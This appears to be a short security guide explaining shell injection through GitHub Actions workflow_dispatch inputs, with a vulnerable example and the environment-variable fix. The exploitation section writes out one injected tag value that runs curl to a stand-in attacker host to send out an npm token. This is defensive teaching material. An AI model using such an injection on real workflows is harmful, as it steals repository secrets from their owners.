# Workflow Dispatch Input Injection

## What it is

When `${{ inputs.* }}` or `${{ github.event.inputs.* }}` expressions are interpolated directly into `run:` blocks, anyone with permission to trigger the workflow can inject arbitrary shell commands. This is the same class of vulnerability as PR title injection, but via workflow_dispatch inputs.

## How it's exploited

```yaml
on:
    workflow_dispatch:
        inputs:
            tag:
                description: "Release tag"

jobs:
    release:
        runs-on: ubuntu-latest
        steps:
            - run: echo "Releasing ${{ inputs.tag }}"
```

A user dispatches the workflow with tag set to `"; curl attacker.com/steal?t=$NPM_TOKEN; echo "` -- the injected command runs with full access to job secrets.

## How to fix

Move the input to an environment variable:

```yaml
# Before (vulnerable)
- run: echo "Releasing ${{ inputs.tag }}"

# After (safe)
- env:
    TAG: ${{ inputs.tag }}
  run: echo "Releasing $TAG"
```

## Why it matters

Workflow dispatch inputs are user-controlled strings. Any user with write access to the repo (or Actions trigger permission) can inject shell commands that run with the workflow's full secret and permission context.
